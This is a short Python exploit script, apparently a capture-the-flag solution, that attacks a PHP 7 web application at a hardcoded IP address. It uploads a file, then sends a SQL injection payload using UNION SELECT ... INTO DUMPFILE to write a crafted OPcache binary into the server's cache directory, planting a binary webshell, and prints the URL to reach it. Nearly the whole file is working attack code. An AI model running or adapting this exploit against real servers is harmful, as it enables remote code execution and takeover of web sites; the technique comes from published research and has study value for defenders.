#!/usr/bin/env python

# https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/

import binascii
import requests
import re

PHPSESSID = "xxxxxxxxxxxxxxxxxxxxxxxxxx"
PAYLOADFILE = "/tmp/OPcache/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/root/w/CTF/alictf2016/homework/payload.php.bin"

# https://github.com/GoSecure/php7-opcache-override
system_id = "39b005ad77428c42788140c6839e6201" 

opcache_folder = "/tmp/OPcache/" + system_id + "/var/www/html/"

cookies = dict(PHPSESSID=PHPSESSID)

def create_entry():
    url = "http://121.40.50.146/upload.php"
    form_data = {'pic': ('payload.php', 'A'), 'detail' : ('', 'A'), 'sub' : ('', 'Submit') }
    response = requests.post(url, files=form_data, cookies=cookies)

    return re.search("Path:(.+)", response.text).group(1)

def inject_opcache(payload, path):
    opcache_hex = binascii.hexlify("OPCACHE\x00" + system_id + payload[40:])
    print len(opcache_hex)

    url = "http://121.40.50.146/detail.php"
    url += "?id="
    url += "-1' UNION SELECT X'" + opcache_hex + "' INTO DUMPFILE '" + opcache_folder + path + ".bin' %23"

    r = requests.get(url, cookies=cookies)

with open(PAYLOADFILE) as f:
    payload = f.read()

entry = create_entry()
inject_opcache(payload, entry)

print "Browse to : http://121.40.50.146/" + entry
